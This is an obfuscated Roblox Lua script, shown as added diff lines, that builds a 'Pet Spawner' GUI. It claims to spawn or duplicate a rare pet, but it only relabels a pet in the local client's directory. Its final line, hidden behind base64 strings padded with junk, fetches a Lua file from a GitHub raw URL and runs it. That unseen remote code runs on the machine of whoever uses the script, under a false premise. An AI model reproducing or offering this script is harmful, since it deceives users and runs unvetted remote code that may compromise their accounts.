+Section:NewButton(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('APycEgxQVdtnYbTmmjVDLHptetBndoulLZlxTqMzwLcBJkVqfpmmehGU3RhcnQgRHVwaW5n'), zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('islbbZAyhOxhyRGaQAdqerhsRyKTttaVEtGLRCoLQyZzQmSCAViQHHqQnV0dG9uSW5mbw=='), function()
+  end
+
+)
+
+local Tab = Window:NewTab(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('pexnNnZPRKskdlMVSfyONAexbwoJdOGZfKGvsstCcsZQbNCKqekTGfWUGV0IFNwYXduZXLwn5Cx'))
+local Section = Tab:NewSection(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('cYDSWWaoAenmBunelxLjqLGPLJfMXhEOHPGsrNanmeTptQzAszRuBNLU3Vic2NyaWJlIFRvIE15IENoYW5uZWw='))
+
+Section:NewLabel(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('LUtAffKEfXhKtopEOaozBwUtuTKBltobQzEGeSioeFExrjavTfdBzBeU2NyaXB0IE1hZGUgQnkgUHJvZGlneUxlZ2VuZHNIUSBPbiBZb3VUdWJl'))
+
+Section:NewTextBox(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('IKKWRzveGNXxgpNTWwlQCxbhgAjJAoAirGxeSEUEimAUKRuPycctAfOUGV0IE5hbWXinI/vuI8='), zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('gUbLltziSbSAGpbBPxBgFCWOoiWgEaetObjclXCvgdAhmznweCqwEVDVGV4dGJveEluZm8='), function(txt)
+    game.StarterGui:SetCore(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('ZTJqiPNkIFLHIuXTLnyhGthLVzlhFmaLuvnEAaKBDAzSaKjmdySIixnU2VuZE5vdGlmaWNhdGlvbg=='),{
+        Title = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('ZnqIqzjPysWJDIgmSrroeBQeLXxVbZdKMWvkoQNwgTYjaRcmtYGrpYIUGV0IE5hbWU=');
+        Text = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('DbxqArWtnPamRGimcDcWXmxziHLWmoAhKoVmuWVTvliTjpYznenIgYlU2V0IFN1Y2Nlc3NmdWxseSE=');
+    })
+end)
+
+Section:NewButton(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('KresMKjYMUASPHUZLpZUwluRsvwcaYEyxcGhpwuHBqzqqTlZwDpIAXTU3RhcnQgU3Bhd25lcg=='), zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('nyeaNeBQMYobTGLTgOcPdwPefDrMTbigYOdnixnYzTHdkpuViOQSiyYQnV0dG9uSW5mbw=='), function()
+    local message = require(game.ReplicatedStorage.Library.Client.Message)
+message.Error(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('rDdrnuIKsJHdbiZYsSSAnRktTPKxEqsmGGUvslLMNNHIFMYHSMNEXUUVGl0YW5pYyBTa2V0Y2ggQ2F0IFN1Y2Nlc3NmdWx5IFNwYXduIFRvIHlvdXIgSW52ZW50b3J5LyBEdXBlIFN1Y2Nlc3NmdWx5'))
+
+    local lib = require(game.ReplicatedStorage.Library)
+
+local fromPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('dNICHElOIYlJOqVEexorQgOrhHMdxspabIbMKRYkWMczUUuxhwQikIHRGFsbWF0aWFu')
+local toPet = zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('LHKKqWkdTnRFkIGQCPFhHnHtiYvchSqsCxIWShQfPkWrIUQMmIJPtcHVGl0YW5pYyBTa2V0Y2ggQ2F0')
+
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+    end
+  end
+
+)
+
+local Tab = Window:NewTab(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('gyHthVpfNqUfKFQFgiCaMMXkRCawFFLeVjKxRhaSiStWcvQAJfjcVvkU2V0dGluZ/CflKk='))
+local Section = Tab:NewSection(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('AlsbWTUUOqPeAZoHnWETNfvwIXmcEATOvIniXSohQWUaHFEHtnrYLnVU3Vic2NyaWJlIFRvIE15IENoYW5uZWw='))
+
+Section:NewLabel(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('JjfsplMKlBLGfeQPHlbMfRsfAfaaQLvveHQoqruXQRnLFmIlIJGIVGtU2NyaXB0IE1hZGUgQnkgUHJvZGlneUxlZ2VuZHNIUSBPbiBZb3VUdWJl'))
+
+local Tab = Window:NewTab(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('ymbdUjKfQgTAQNPUDPbRJJUnblmezzkXUFoCkunRcPHhqIqVsElbFJwTWlzYw=='))
+local Section = Tab:NewSection(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('DLJTtxWltYAJCXcPPkNPIBdvBmxqjThvbNcZjChsKuNgTuBUPMRRNdjU3Vic2NyaWJlIFRvIE15IENoYW5uZWw='))
+
+Section:NewLabel(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('NDZSauJZYWZqCijMJHTKhRdJiEiHaCJhaCyFrWsvvtmSexnaMNHHjnWU2NyaXB0IE1hZGUgQnkgUHJvZGlneUxlZ2VuZHNIUSBPbiBZb3VUdWJl'))
+
+local Tab = Window:NewTab(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('IAGLPPzzokpdquBjWBPvyOlmZhdWcNoELgvmsDmSYaZdbwpWHMuqpiPUGxheWVy8J+RqA=='))
+local Section = Tab:NewSection(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('USfTzmoRRwRHWyaMaTbrMTjKHEFfjOaIXaKudaPRnGFxJrDxMyPgpyVU3Vic2NyaWJlIFRvIE15IENoYW5uZWw='))
+
+Section:NewLabel(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('PpVfyIFxqIqMskliJrrEsxcLdZWCJUgtfwEPcvzDGfjUfZjvGownqXmU2NyaXB0IE1hZGUgQnkgUHJvZGlneUxlZ2VuZHNIUSBPbiBZb3VUdWJl'))
+
+loadstring(game:HttpGet(zvHTneSruhJEGFUBUpKToMfRBcVSOhZqvojkqqpBWxVIVqWAogseeWHsdcVttJooGMwcpbsHgTWMtMkaJPyNuDWdFkJKNiuKa('aTWYFRKMLGLuXltKDnYncACBezVNCUOLBHQrInWnuWHZzZjHaZZGwSpaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RvYmk0MzdhL1NjcmlwdHMvbWFpbi81ZmNhZDg4OTA1NTA4M2E0NThjYzk5NDkubHVh')))()
